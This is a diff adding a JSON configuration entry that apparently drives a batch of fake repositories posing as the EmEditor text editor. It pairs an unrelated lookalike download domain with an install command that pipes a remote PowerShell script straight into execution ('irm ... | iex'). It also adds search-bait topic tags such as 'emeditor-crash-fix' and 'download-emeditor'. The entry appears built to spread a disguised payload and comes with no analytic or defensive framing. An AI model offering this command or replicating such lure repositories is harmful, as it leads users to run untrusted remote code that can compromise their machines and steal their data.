@@ -1,0 +1,29 @@
+{
+  "repo": "emeditor-gigabyte-file-editor",
+  "product": "EmEditor Gigabyte File Editor",
+  "kind": "editor",
+  "install_type": "download",
+  "download_url": "https://emeditor.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "editor",
+  "topics": [
+    "emeditor-release",
+    "emeditor-program",
+    "emeditor-code-editor",
+    "emeditor-win10",
+    "emeditor-crash-fix",
+    "emeditor-setup-windows",
+    "emeditor-text-editor",
+    "emeditor-local-client",
+    "emeditor-quick-start",
+    "emeditor-start-2026",
+    "download-emeditor",
+    "windows-tools",
+    "programming-tools",
+    "desktop-tools",
+    "setup-guide"
+  ]
+}
